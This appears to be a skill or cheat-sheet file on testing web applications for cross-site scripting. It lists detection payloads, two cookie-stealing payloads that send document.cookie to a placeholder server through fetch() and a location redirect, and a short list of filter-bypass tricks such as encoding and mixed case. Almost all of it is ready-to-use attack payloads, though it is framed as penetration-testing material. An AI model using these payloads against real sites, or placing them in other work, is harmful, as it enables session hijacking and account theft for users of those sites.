---
name: testing-for-xss-vulnerabilities
description: Test for Cross-Site Scripting (XSS) vulnerabilities in web applications across reflective, stored, and DOM-based contexts.
domain: cybersecurity
subdomain: web
tags:
- web
- xss
- cross-site-scripting
- client-side
- exploitation
version: '1.0'
---
# Cross-Site Scripting (XSS)

## Detection Payloads
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
```

## Cookie Stealing
```html
<script>fetch('https://server/?c='+document.cookie)</script>
<img src=x onerror="location.href='https://server/?c='+document.cookie">
```

## Key Bypass Techniques
- `%3Cscript%3E` URL encoding
- `<ScRiPt>` mixed case (if filter is case-sensitive)
- Use `onerror`, `onfocus`, `onmouseover` instead of `<script>`
- `javascript:` pseudo-protocol in links
